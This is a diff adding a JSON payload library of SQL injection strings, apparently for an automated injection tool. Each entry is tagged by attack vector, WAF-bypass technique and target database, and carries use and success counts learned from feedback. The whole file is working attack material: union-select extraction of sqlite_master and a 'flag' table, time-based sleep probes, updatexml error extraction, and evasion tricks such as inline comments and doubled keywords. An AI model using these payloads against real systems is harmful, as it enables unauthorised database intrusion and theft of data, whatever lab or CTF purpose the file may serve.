@@ -1,0 +1,440 @@
+[
+ {
+  "payload": "1'",
+  "vector": "error",
+  "target_waf": null,
+  "bypass_tags": [
+   "quote_parity"
+  ],
+  "dbms": null,
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 49,
+  "is_active": 1
+ },
+ {
+  "payload": "1''",
+  "vector": "error",
+  "target_waf": null,
+  "bypass_tags": [
+   "quote_parity"
+  ],
+  "dbms": null,
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 0,
+  "is_active": 1
+ },
+ {
+  "payload": "1 and 1=1",
+  "vector": "boolean",
+  "target_waf": null,
+  "bypass_tags": [
+   "numeric"
+  ],
+  "dbms": "mysql",
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 0,
+  "is_active": 1
+ },
+ {
+  "payload": "2-1",
+  "vector": "boolean",
+  "target_waf": null,
+  "bypass_tags": [
+   "numeric"
+  ],
+  "dbms": null,
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 0,
+  "is_active": 1
+ },
+ {
+  "payload": "' and '1'='1",
+  "vector": "boolean",
+  "target_waf": null,
+  "bypass_tags": [
+   "comment_close"
+  ],
+  "dbms": null,
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 0,
+  "is_active": 1
+ },
+ {
+  "payload": "1'-- ",
+  "vector": "boolean",
+  "target_waf": null,
+  "bypass_tags": [
+   "comment_close"
+  ],
+  "dbms": null,
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 0,
+  "is_active": 1
+ },
+ {
+  "payload": "1'%23",
+  "vector": "boolean",
+  "target_waf": null,
+  "bypass_tags": [
+   "encoding",
+   "comment_close"
+  ],
+  "dbms": null,
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 0,
+  "is_active": 1
+ },
+ {
+  "payload": "1 desc,1",
+  "vector": "boolean",
+  "target_waf": null,
+  "bypass_tags": [
+   "order_by"
+  ],
+  "dbms": null,
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 0,
+  "is_active": 1
+ },
+ {
+  "payload": "1 desc,999",
+  "vector": "error",
+  "target_waf": null,
+  "bypass_tags": [
+   "order_by"
+  ],
+  "dbms": null,
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 0,
+  "is_active": 1
+ },
+ {
+  "payload": "1 /*!44444and*/ /*!444442*/=2--+",
+  "vector": "boolean",
+  "target_waf": "通用",
+  "bypass_tags": [
+   "inline_comment"
+  ],
+  "dbms": "mysql",
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 0,
+  "is_active": 1
+ },
+ {
+  "payload": "1' /*!44444and*/ /*!2*/=2--+",
+  "vector": "boolean",
+  "target_waf": "通用",
+  "bypass_tags": [
+   "inline_comment"
+  ],
+  "dbms": "mysql",
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 0,
+  "is_active": 1
+ },
+ {
+  "payload": "1' like'1'='1",
+  "vector": "boolean",
+  "target_waf": "通用",
+  "bypass_tags": [
+   "bypass"
+  ],
+  "dbms": null,
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 0,
+  "is_active": 1
+ },
+ {
+  "payload": "1' and '1'<>'2",
+  "vector": "boolean",
+  "target_waf": "通用",
+  "bypass_tags": [
+   "bypass"
+  ],
+  "dbms": null,
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 0,
+  "is_active": 1
+ },
+ {
+  "payload": "1' and '1'regexp'1",
+  "vector": "boolean",
+  "target_waf": "通用",
+  "bypass_tags": [
+   "bypass"
+  ],
+  "dbms": "mysql",
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 5,
+  "is_active": 1
+ },
+ {
+  "payload": "1' group by 1--+",
+  "vector": "boolean",
+  "target_waf": "通用",
+  "bypass_tags": [
+   "order_by",
+   "inline_comment"
+  ],
+  "dbms": "mysql",
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 191,
+  "is_active": 1
+ },
+ {
+  "payload": "1'/**/order/*/**/by/**/1--+",
+  "vector": "boolean",
+  "target_waf": "通用",
+  "bypass_tags": [
+   "whitespace",
+   "order_by"
+  ],
+  "dbms": null,
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 199,
+  "is_active": 1
+ },
+ {
+  "payload": "1'union /*/1*1*//*!44444select*/ 1,2,3--+",
+  "vector": "union",
+  "target_waf": "通用",
+  "bypass_tags": [
+   "inline_comment",
+   "union"
+  ],
+  "dbms": "mysql",
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 201,
+  "is_active": 1
+ },
+ {
+  "payload": "1' and/*/x*y*/if(1=1,sleep(/**/5),2)%23",
+  "vector": "time",
+  "target_waf": "通用",
+  "bypass_tags": [
+   "inline_comment",
+   "time",
+   "encoding"
+  ],
+  "dbms": "mysql",
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 235,
+  "is_active": 1
+ },
+ {
+  "payload": "1'||'x",
+  "vector": "error",
+  "target_waf": null,
+  "bypass_tags": [
+   "sqlite"
+  ],
+  "dbms": "sqlite",
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 255,
+  "is_active": 1
+ },
+ {
+  "payload": "' union select sqlite_version(),2,3-- ",
+  "vector": "union",
+  "target_waf": null,
+  "bypass_tags": [
+   "sqlite",
+   "union"
+  ],
+  "dbms": "sqlite",
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 261,
+  "is_active": 1
+ },
+ {
+  "payload": "' UNION ALL SELECT 12,version()::text,3,4,5,6-- ",
+  "vector": "union",
+  "target_waf": null,
+  "bypass_tags": [
+   "postgresql",
+   "union"
+  ],
+  "dbms": "postgresql",
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 274,
+  "is_active": 1
+ },
+ {
+  "payload": "' UNION ALL SELECT 12,flag.id::text,flag.flag_value::text,flag.created_at::text,123,1234 FROM flag-- ",
+  "vector": "union",
+  "target_waf": null,
+  "bypass_tags": [
+   "postgresql",
+   "union"
+  ],
+  "dbms": "postgresql",
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 286,
+  "is_active": 1
+ },
+ {
+  "payload": "1' and '1'='1",
+  "vector": "boolean",
+  "target_waf": null,
+  "bypass_tags": null,
+  "dbms": null,
+  "source": "manual",
+  "success_count": 0,
+  "use_count": 881,
+  "is_active": 1
+ },
+ {
+  "payload": "id=1001) AND 9885=9885 AND (1311=1311",
+  "vector": "boolean",
+  "target_waf": null,
+  "bypass_tags": null,
+  "dbms": null,
+  "source": "auto_feedback",
+  "success_count": 13,
+  "use_count": 994,
+  "is_active": 1
+ },
+ {
+  "payload": "1'/**/and/**/'1'='1",
+  "vector": "boolean",
+  "target_waf": null,
+  "bypass_tags": [
+   "inline_comment"
+  ],
+  "dbms": null,
+  "source": "auto_feedback",
+  "success_count": 1,
+  "use_count": 30,
+  "is_active": 1
+ },
+ {
+  "payload": "1' and (select 1)=1--",
+  "vector": "boolean",
+  "target_waf": null,
+  "bypass_tags": [],
+  "dbms": null,
+  "source": "auto_feedback",
+  "success_count": 2,
+  "use_count": 30,
+  "is_active": 1
+ },
+ {
+  "payload": "1\" and if(1=1,sleep(3),1)-- -",
+  "vector": "time",
+  "target_waf": null,
+  "bypass_tags": [],
+  "dbms": null,
+  "source": "auto_feedback",
+  "success_count": 2,
+  "use_count": 30,
+  "is_active": 1
+ },
+ {
+  "payload": "zhangsan'and(updatexml(1,concat(0x7e,database(),0x7e),1))and'1'='1",
+  "vector": "error",
+  "target_waf": null,
+  "bypass_tags": [
+   "hex_encoding",
+   "function_alt"
+  ],
+  "dbms": null,
+  "source": "auto_feedback",
+  "success_count": 3,
+  "use_count": 14,
+  "is_active": 1
+ },
+ {
+  "payload": "zhangsan'",
+  "vector": "error",
+  "target_waf": null,
+  "bypass_tags": [],
+  "dbms": null,
+  "source": "auto_feedback",
+  "success_count": 1,
+  "use_count": 4,
+  "is_active": 1
+ },
+ {
+  "payload": "zhangsan' and (select 1)=1--",
+  "vector": "error",
+  "target_waf": null,
+  "bypass_tags": [],
+  "dbms": null,
+  "source": "auto_feedback",
+  "success_count": 1,
+  "use_count": 4,
+  "is_active": 1
+ },
+ {
+  "payload": "zhangsan'/**/and/**/(sselectelect/**/1)=1--/**/",
+  "vector": "error",
+  "target_waf": null,
+  "bypass_tags": [
+   "inline_comment",
+   "double_write"
+  ],
+  "dbms": null,
+  "source": "auto_feedback",
+  "success_count": 1,
+  "use_count": 4,
+  "is_active": 1
+ },
+ {
+  "payload": "-1' union select 1,group_concat(name),3,4 from sqlite_master--",
+  "vector": "union",
+  "target_waf": null,
+  "bypass_tags": [],
+  "dbms": null,
+  "source": "auto_feedback",
+  "success_count": 1,
+  "use_count": 4,
+  "is_active": 1
+ },
+ {
+  "payload": "-1'/**/uunionnion/**/sselectelect/**/1,group_concat(name),3,4/**/ffromrom/**/sqlite_master--/**/",
+  "vector": "union",
+  "target_waf": null,
+  "bypass_tags": [
+   "inline_comment",
+   "double_write"
+  ],
+  "dbms": null,
+  "source": "auto_feedback",
+  "success_count": 1,
+  "use_count": 4,
+  "is_active": 1
+ },
+ {
+  "payload": "category=&q=1%' AND 8333=8333 AND 'OZfL%'='OZfL",
+  "vector": "boolean",
+  "target_waf": null,
+  "bypass_tags": [],
+  "dbms": "PostgreSQL",
+  "source": "auto_feedback",
+  "success_count": 1,
+  "use_count": 0,
+  "is_active": 1
+ }
+]
